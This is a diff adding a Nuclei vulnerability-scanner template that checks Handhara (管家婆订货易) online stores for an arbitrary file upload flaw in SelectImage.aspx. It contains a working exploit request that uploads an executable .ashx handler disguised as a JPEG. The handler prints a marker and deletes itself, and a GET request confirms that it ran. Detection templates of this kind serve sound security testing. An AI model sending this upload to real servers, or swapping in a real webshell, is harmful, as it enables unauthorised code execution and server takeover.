@@ -1,0 +1,92 @@
+id: handhara-erp-selectimage-fileupload
+
+info:
+  name: Handhara ERP SelectImage.aspx 任意文件上传漏洞
+  author: bl
+  severity: high
+  description: |
+    管家婆订货易在线商城 /DialogTemplates/SelectImage.aspx 接口存在任意文件上传漏洞。
+    攻击者可通过构造恶意的 multipart/form-data 请求，上传 .ashx（ASP.NET WebHandler）文件到服务器，
+    从而在目标服务器上执行任意 C# 代码，获取服务器控制权。
+  impact: |
+    攻击者可上传 WebShell（.ashx 文件），在服务器上执行任意代码，导致：
+    - 服务器被完全控制
+    - 敏感数据泄露
+    - 内网横向渗透
+    - 网站被篡改或植入后门
+  remediation: |
+    1. 对文件上传接口的文件类型进行严格校验，禁止上传 .ashx、.aspx、.cs 等可执行文件
+    2. 对上传目录设置脚本执行权限限制
+    3. 对上传的文件名进行重命名，避免使用用户可控的文件名
+    4. 建议升级系统至最新版本或联系厂商获取安全补丁
+  metadata:
+    verified: true
+  tags: 管家婆订货易在线商城
+
+variables:
+  r1: "{{rand_base(20)}}"
+  r2: "{{rand_base(20)}}"
+  rboundary: "{{rand_base(30)}}"
+
+requests:
+  - raw:
+      - |
+        POST /DialogTemplates/SelectImage.aspx?type=titleimg&size=30*100&pageindex=1&iscallback=true HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary={{rboundary}}
+
+        --{{rboundary}}
+        Content-Disposition: form-data; name="Filedata"; filename="{{r1}}.ashx"
+        Content-Type: image/jpeg
+
+        <% @ webhandler language="C#" class="AverageHandler" %>
+        using System;
+        using System.Web;
+        using System.Diagnostics;
+        using System.IO;
+
+        public class AverageHandler : IHttpHandler
+        {
+         public bool IsReusable
+         {
+           get { return true; }
+         }
+
+         public void ProcessRequest(HttpContext ctx)
+         {
+           Uri url = new Uri(HttpContext.Current.Request.Url.Scheme + "://" +  HttpContext.Current.Request.Url.Authority + HttpContext.Current.Request.RawUrl);
+           ctx.Response.Write("{{r2}}");
+          try
+         {
+          File.Delete(System.Web.HttpContext.Current.Request.PhysicalApplicationPath + url.LocalPath);
+         }
+         catch(Exception error)
+         {
+          ctx.Response.Write(error);
+         }
+         }
+        }
+        --{{rboundary}}--
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, "/templates/")'
+        internal: true
+
+    extractors:
+      - type: regex
+        name: filepath
+        group: 1
+        regex:
+          - '/templates/([^.]+)\.ashx'
+        internal: true
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/templates/{{filepath}}.ashx"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, "{{r2}}")'
